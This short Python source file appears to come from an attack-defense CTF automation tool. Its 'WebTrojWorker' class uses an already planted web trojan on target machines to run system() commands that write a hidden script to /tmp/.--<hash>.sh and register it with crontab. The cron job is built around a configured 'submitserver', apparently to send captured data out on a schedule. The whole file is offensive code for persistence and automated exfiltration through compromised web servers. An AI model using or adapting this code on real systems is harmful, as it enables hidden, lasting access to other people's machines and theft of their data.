import Tools


class WebTrojWorker:
    def __init__(self, config,parent):
        self.cmdtpl=config['env']['cmd_tpl']
        self.submitserver=config['submitserver']
        self.cmdBuilder=Tools.CmdBuilder(self.cmdtpl)
        self.parent=parent
    def start(self):
        #
        pass
    def Attack_Crontab(self,index,cmd):
        rawCrontabStr_autoSubmit=self.cmdBuilder.buildCrontab(self.submitserver,cmd)
        crontabStr,md5Str=self.cmdBuilder.buildCmd(rawCrontabStr_autoSubmit)
        self.parent.runTeamCmd(index,f'system(\'{crontabStr}\')')
        return self.parent.runTeamCmd(index,f'system(\'/usr/bin/crontab /tmp/.--{md5Str}.sh\')')
